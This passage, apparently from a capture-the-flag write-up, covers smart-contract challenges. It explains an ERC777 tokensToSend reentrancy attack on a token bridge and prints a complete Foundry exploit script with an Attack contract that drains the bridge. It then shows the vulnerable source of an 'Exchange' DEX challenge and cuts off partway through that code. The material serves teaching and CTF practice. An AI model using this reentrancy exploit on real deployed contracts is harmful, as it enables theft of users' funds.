&lt;&#x2F;span&gt;&lt;span&gt;        _callTokensToSend(operator, from, to, amount, userData, operatorData);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _move(operator, from, to, amount, userData, operatorData);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _callTokensToSend(
&lt;&#x2F;span&gt;&lt;span&gt;        address operator,
&lt;&#x2F;span&gt;&lt;span&gt;        address from,
&lt;&#x2F;span&gt;&lt;span&gt;        address to,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes memory userData,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes memory operatorData
&lt;&#x2F;span&gt;&lt;span&gt;    ) private {
&lt;&#x2F;span&gt;&lt;span&gt;        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);
&lt;&#x2F;span&gt;&lt;span&gt;        if (implementer != address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;attack&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#attack&quot; aria-label=&quot;Anchor link for: attack&quot;&gt;Attack&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Deploy an Attacker contract and register this attacker contract as the Implementer for the Player.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Send &lt;code&gt;0.5 ether&lt;&#x2F;code&gt; amount of ERC777 tokens to Attack&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Inside &lt;code&gt;tokensToSend(operator, from, to, amount, userData, operatorData)&lt;&#x2F;code&gt; function of Attack contract, add the following logic&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;reenter to the &lt;code&gt;ERC20Out()&lt;&#x2F;code&gt; function by sending same &lt;code&gt;amount&lt;&#x2F;code&gt; again.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Start the attack by calling &lt;code&gt;ERC20Out()&lt;&#x2F;code&gt; function with amount &lt;code&gt;0.5 ether&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The following vulnerable lines of code will execute&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;    uint256 balance = IERC20(_token).balanceOf(address(this));  &#x2F;&#x2F; 100 ether
&lt;&#x2F;span&gt;&lt;span&gt;    require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), &amp;quot;T&amp;quot;); &#x2F;&#x2F; Call to Attack.tokensToSend()
&lt;&#x2F;span&gt;&lt;span&gt;    _amount = IERC20(_token).balanceOf(address(this)) - balance;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Attack contract wil reenter the function with amount &lt;code&gt;0.5 ether&lt;&#x2F;code&gt;, but the bridge balance is still 100 ether.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Second &lt;code&gt;tranferFrom&lt;&#x2F;code&gt; call from Attack will be succeeded and Attack contract will get &lt;code&gt;0.5 ether&lt;&#x2F;code&gt; of &lt;code&gt;BridgedERC20&lt;&#x2F;code&gt; tokens. Bridge also gets &lt;code&gt;0.5 ether&lt;&#x2F;code&gt; of ERC777 tokens.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;First &lt;code&gt;transferFrom&lt;&#x2F;code&gt; call completes will get &lt;code&gt;0.5 ether&lt;&#x2F;code&gt; of &lt;code&gt;BridgedERC20&lt;&#x2F;code&gt; tokens. Bridge also gets &lt;code&gt;0.5 ether&lt;&#x2F;code&gt; of ERC777 tokens. Bridge balance is now &lt;code&gt;101 ether&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now on the third line &lt;code&gt; _amount = IERC20(_token).balanceOf(address(this)) - balance;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_amount = 101 ether - 100 ether = 1 ether&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now the  &lt;code&gt;1 ether&lt;&#x2F;code&gt; of &lt;code&gt;BridgedERC20&lt;&#x2F;code&gt; will be minted to Player.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If we bridge these tokens back, &lt;code&gt;BridgedERC20&lt;&#x2F;code&gt; will be burned and &lt;code&gt;ERC777&lt;&#x2F;code&gt;(FLAG) tokens will be sent to Player.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After one successfull iteration of these steps we got &lt;code&gt;0.5 ether&lt;&#x2F;code&gt; of more tokens than we have.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Now do you own math and find a way to execute this logic until you got atleast &lt;code&gt;10 ether&lt;&#x2F;code&gt; of ERC777 tokens or FLAG tokens.&lt;&#x2F;p&gt;
&lt;p&gt;Don&#x27;t look at my following exploit, I did a terrible math there.&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Bridge.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: SEE LICENSE IN LICENSE
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.20;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script} from &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console} from &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Bridge, Token, BridgedERC20} from &amp;quot;..&#x2F;src&#x2F;Bridge.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {IERC20, IERC20Metadata} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;extensions&#x2F;IERC20Metadata.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {IERC777Sender} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC777&#x2F;IERC777Sender.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {IERC1820Registry} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;utils&#x2F;introspection&#x2F;IERC1820Registry.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {ERC1820Implementer} from &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;utils&#x2F;introspection&#x2F;ERC1820Implementer.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;contract BridgeSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Bridge public bridge = Bridge(payable(0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba));
&lt;&#x2F;span&gt;&lt;span&gt;    Bridge public remoteBridge;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public flagToken;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    address public relayer;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public CHAIN_ID = 1;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public REMOTE_CHAIN_ID = 2;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256(&amp;quot;ERC777TokensSender&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() public {
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player : &amp;quot;, player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance: &amp;quot;, player.balance);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Bridge: &amp;quot;, address(bridge));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;Bridge balance: &amp;quot;, address(bridge).balance);
&lt;&#x2F;span&gt;&lt;span&gt;        flagToken = Token(bridge.FLAG_TOKEN());
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; relayer = bridge.relayer();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;FLAG_TOKEN: &amp;quot;, address(flagToken));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of FLAG : &amp;quot;, flagToken.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;SOURCE Bridge balance of FLAG : &amp;quot;, flagToken.balanceOf(address(bridge)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;SOURCE CHAIN_ID : &amp;quot;, CHAIN_ID);
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;isSolved(): &amp;quot;, bridge.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Total Default operators of FLAG : &amp;quot;, flagToken.defaultOperators().length); &#x2F;&#x2F; NO operators
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;Relayer: &amp;quot;, relayer);
&lt;&#x2F;span&gt;&lt;span&gt;        remoteBridge = Bridge(payable(bridge.remoteBridge(REMOTE_CHAIN_ID)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;REMOTE CHAIN_ID : &amp;quot;, REMOTE_CHAIN_ID);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;REMOTE Bridge: &amp;quot;, address(remoteBridge));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;REMOTE Bridge balance: &amp;quot;, address(remoteBridge).balance);
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack = new Attack(address(bridge), &#x2F;*address(bridgedToken)*&#x2F; address(flagToken), player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attack : &amp;quot;, address(attack));
&lt;&#x2F;span&gt;&lt;span&gt;       _ERC1820_REGISTRY.setInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH, address(attack));
&lt;&#x2F;span&gt;&lt;span&gt;        require(attack.isRegister()==address(attack), &amp;quot;Failed to set interface&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        flagToken.approve(address(bridge), type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        address bridgedToken;
&lt;&#x2F;span&gt;&lt;span&gt;        while (flagToken.balanceOf(address(bridge)) &amp;gt; 89 ether) {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; for (uint8 i; i &amp;lt;=1; i++){
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 amount = flagToken.balanceOf(address(player))&#x2F;2;
&lt;&#x2F;span&gt;&lt;span&gt;            flagToken.transfer(address(attack), amount);
&lt;&#x2F;span&gt;&lt;span&gt;            bridge.ERC20Out(address(flagToken), player, amount);
&lt;&#x2F;span&gt;&lt;span&gt;            bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
&lt;&#x2F;span&gt;&lt;span&gt;            attack.sendMeback();
&lt;&#x2F;span&gt;&lt;span&gt;            remoteBridge.ERC20Out(bridgedToken, player, BridgedERC20(bridgedToken).balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;REMOTE Bridge balance of FLAG : &amp;quot;, flagToken.balanceOf(address(remoteBridge)));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;IS FLAG token registed at remote : &amp;quot;, bridge.isTokenRegisteredAtRemote(REMOTE_CHAIN_ID, address(flagToken)));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;FLAG token to local token(BridgedERC20) : &amp;quot;, bridgedToken);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of BridgedERC20 : &amp;quot;, BridgedERC20(bridgedToken).balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;Attack balance of BridgedERC20 : &amp;quot;, BridgedERC20(bridgedToken).balanceOf(address(attack)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of FLAG : &amp;quot;, flagToken.balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;SOURCE Bridge balance of FLAG : &amp;quot;, flagToken.balanceOf(address(bridge)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attack balance of FLAG : &amp;quot;, flagToken.balanceOf(address(attack)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved(): &amp;quot;, bridge.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack is ERC1820Implementer, IERC777Sender {
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; BridgedERC20 public bridgedERC20;
&lt;&#x2F;span&gt;&lt;span&gt;    Bridge public bridge;
&lt;&#x2F;span&gt;&lt;span&gt;    address public flagToken;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256(&amp;quot;ERC777TokensSender&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _bridge, &#x2F;*address _bridgedERC20,*&#x2F; address _flagToken, address _player) {
&lt;&#x2F;span&gt;&lt;span&gt;        bridge = Bridge(payable(_bridge));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; bridgedERC20 = BridgedERC20(_bridgedERC20);
&lt;&#x2F;span&gt;&lt;span&gt;        flagToken = _flagToken;
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;        _registerInterfaceForAddress(_TOKENS_SENDER_INTERFACE_HASH, player);
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20(flagToken).approve(address(bridge), type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function isRegister() public returns (address implementer){
&lt;&#x2F;span&gt;&lt;span&gt;        implementer = _ERC1820_REGISTRY.getInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function sendMeback() external {
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20(flagToken).transfer(player, IERC20(flagToken).balanceOf(address(this)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function tokensToSend(
&lt;&#x2F;span&gt;&lt;span&gt;        address operator,
&lt;&#x2F;span&gt;&lt;span&gt;        address from,
&lt;&#x2F;span&gt;&lt;span&gt;        address to,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes calldata userData,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes calldata operatorData
&lt;&#x2F;span&gt;&lt;span&gt;    ) external {
&lt;&#x2F;span&gt;&lt;span&gt;        if ((from == player &amp;amp;&amp;amp; to == address(this)) || (from == address(bridge) &amp;amp;&amp;amp; to == player)){
&lt;&#x2F;span&gt;&lt;span&gt;            return;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        bridge.ERC20Out(address(flagToken), player, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;exchange&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#exchange&quot; aria-label=&quot;Anchor link for: exchange&quot;&gt;Exchange&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;You heard there is a new Dex primitive that has launched on-chain with a lot of tokens. As a whitehat hacker, you race to find any bugs before the blackhats do. Can you rescue the tokens from the contract?&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Exchange.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.24;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface SwapCallback {
&lt;&#x2F;span&gt;&lt;span&gt;    function doSwap() external;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Setup {
&lt;&#x2F;span&gt;&lt;span&gt;    Exchange public immutable exchange = new Exchange();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 balance1 = 300_000;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 balance2 = 300_000;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 balance3 = 600_000;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token1 = new Token(balance1);
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token2 = new Token(balance2);
&lt;&#x2F;span&gt;&lt;span&gt;    Token public token3 = new Token(balance3);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.addToken(address(token1));
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.addToken(address(token2));
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.addToken(address(token3));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        token1.approve(address(exchange), balance1);
&lt;&#x2F;span&gt;&lt;span&gt;        token2.approve(address(exchange), balance2);
&lt;&#x2F;span&gt;&lt;span&gt;        token3.approve(address(exchange), balance3);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.addLiquidity(address(token1), address(token2), balance1 &#x2F; 3, balance2 &#x2F; 3);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.addLiquidity(address(token1), address(token3), balance1 &#x2F; 3, balance3 &#x2F; 3);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        exchange.addLiquidity(address(token2), address(token3), balance2 &#x2F; 3, balance3 &#x2F; 3);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() public view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return (
&lt;&#x2F;span&gt;&lt;span&gt;            Token(token1).balanceOf(address(exchange)) == 0 &amp;amp;&amp;amp; Token(token2).balanceOf(address(exchange)) == 0
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;amp;&amp;amp; Token(token3).balanceOf(address(exchange)) == 0
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Exchange {
&lt;&#x2F;span&gt;&lt;span&gt;    struct Pool {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 leftReserves;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 rightReserves;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    struct SavedBalance {
&lt;&#x2F;span&gt;&lt;span&gt;        bool initiated;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 balance;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    struct SwapState {
&lt;&#x2F;span&gt;&lt;span&gt;        bool hasBegun;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 unsettledTokens;
&lt;&#x2F;span&gt;&lt;span&gt;        mapping(address =&amp;gt; int256) positions;
&lt;&#x2F;span&gt;&lt;span&gt;        mapping(address =&amp;gt; SavedBalance) savedBalances;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    address public admin;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 nonce = 0;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; bool) public allowedTokens;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(uint256 =&amp;gt; SwapState) private swapStates;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; mapping(address =&amp;gt; Pool)) private pools;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;        admin = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function addToken(address token) public {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == admin, &amp;quot;not admin&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        allowedTokens[token] = true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier duringSwap() {
&lt;&#x2F;span&gt;&lt;span&gt;        require(swapStates[nonce].hasBegun, &amp;quot;swap not in progress&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getSwapState() internal view returns (SwapState storage) {
&lt;&#x2F;span&gt;&lt;span&gt;        return swapStates[nonce];
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getPool(address tokenA, address tokenB)
&lt;&#x2F;span&gt;&lt;span&gt;        internal
&lt;&#x2F;span&gt;&lt;span&gt;        view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (address left, address right, Pool storage pool)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        require(tokenA != tokenB);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (tokenA &amp;lt; tokenB) {
&lt;&#x2F;span&gt;&lt;span&gt;            left = tokenA;
&lt;&#x2F;span&gt;&lt;span&gt;            right = tokenB;
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            left = tokenB;
&lt;&#x2F;span&gt;&lt;span&gt;            right = tokenA;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        pool = pools[left][right];
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getReserves(address token, address other) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        (address left,, Pool storage pool) = getPool(token, other);
&lt;&#x2F;span&gt;&lt;span&gt;        return token == left ? pool.leftReserves : pool.rightReserves;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setReserves(address token, address other, uint256 amount) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        (address left,, Pool storage pool) = getPool(token, other);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (token == left) pool.leftReserves = amount;
&lt;&#x2F;span&gt;&lt;span&gt;        else pool.rightReserves = amount;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getLiquidity(address left, address right) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        (,, Pool storage pool) = getPool(left, right);
&lt;&#x2F;span&gt;&lt;span&gt;        return pool.leftReserves * pool.rightReserves;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function addLiquidity(address left, address right, uint256 amountLeft, uint256 amountRight) public {
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[left], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[right], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Token(left).transferFrom(msg.sender, address(this), amountLeft);
&lt;&#x2F;span&gt;&lt;span&gt;        Token(right).transferFrom(msg.sender, address(this), amountRight);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        setReserves(left, right, getReserves(left, right) + amountLeft);
&lt;&#x2F;span&gt;&lt;span&gt;        setReserves(right, left, getReserves(right, left) + amountRight);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function swap() external {
&lt;&#x2F;span&gt;&lt;span&gt;        SwapState storage swapState = getSwapState();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(!swapState.hasBegun, &amp;quot;swap already in progress&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        swapState.hasBegun = true;
